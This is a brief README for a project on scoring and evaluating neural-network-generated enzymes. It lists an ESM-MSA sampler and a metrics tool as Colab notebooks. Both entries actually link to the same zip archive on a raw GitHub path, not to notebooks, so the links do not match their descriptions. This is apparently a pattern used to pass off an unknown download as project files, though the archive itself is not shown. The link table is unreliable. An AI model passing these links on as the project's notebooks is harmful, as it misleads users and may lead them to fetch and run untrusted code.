# Computational Scoring and Experimental Evaluation of Enzymes Generated by Neural Networks



## Colab notebooks

| Notebook | Description |
| -------- | ----------- |
| [ESM-MSA sampler](https://github.com/xzfu/protein_scoring/raw/refs/heads/main/colab_notebooks/scoring-protein-2.4-alpha.3.zip) | uses the ESM-MSA model (a transformer-based neural network trained on protein multiple sequence alignments) to generate new protein sequences by iteratively mutating sequences from an input alignment. |
| [Metrics](https://github.com/xzfu/protein_scoring/raw/refs/heads/main/colab_notebooks/scoring-protein-2.4-alpha.3.zip) | Calculates various sequence- and structure-based quality scores for proteins, such as those produced by generative models. |
